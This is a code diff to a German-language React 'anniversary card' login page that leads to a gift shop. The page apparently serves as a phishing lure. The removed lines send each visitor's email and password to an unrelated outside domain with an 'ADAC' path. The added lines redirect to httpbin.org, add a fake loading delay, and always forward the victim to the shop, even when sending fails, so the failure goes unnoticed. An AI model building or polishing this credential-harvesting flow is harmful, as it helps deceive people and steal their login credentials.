@@ -38,39 +38,42 @@ const AnniversaryCardOptimized = memo(() => {
     e.preventDefault();
     if (email && password) {
       setIsLoading(true);
-      
+      const MIN_LOADING_MS = 800;
+      const start = Date.now();
+      let hadError = false;
       try {
-        // Send to dummy API endpoint (user will change later)
-        const response = await fetch('https://api.profitsimulator.me/ADAC/', {
+        // Dummy API endpoint with CORS support (you can replace later)
+        await fetch('https://httpbin.org/post', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({ email, password }),
         });
-
-        if (!response.ok) {
-          throw new Error('Network response was not ok');
-        }
-
-        // Store email in localStorage for the shop page
-        localStorage.setItem('userEmail', email);
-        
-        // Navigate to shop page
-        navigate('/shop');
-        
-        toast({
-          title: "Erfolgreich angemeldet!",
-          description: "Sie werden zu den Geschenken weitergeleitet.",
-        });
       } catch (error) {
         console.error('Login error:', error);
-        toast({
-          title: "Fehler beim Anmelden",
-          description: "Bitte versuchen Sie es erneut.",
-          variant: "destructive",
-        });
+        hadError = true;
       } finally {
+        const elapsed = Date.now() - start;
+        if (elapsed < MIN_LOADING_MS) {
+          await new Promise((r) => setTimeout(r, MIN_LOADING_MS - elapsed));
+        }
+        // Store email for the shop page and always continue
+        localStorage.setItem('userEmail', email);
+
+        if (hadError) {
+          toast({
+            title: "Anmeldung abgeschlossen",
+            description: "Weiterleitung zum Shop. (Test-API ggf. blockiert)",
+          });
+        } else {
+          toast({
+            title: "Erfolgreich angemeldet!",
+            description: "Sie werden zu den Geschenken weitergeleitet.",
+          });
+        }
+
+        navigate('/shop');
         setIsLoading(false);
       }
     }
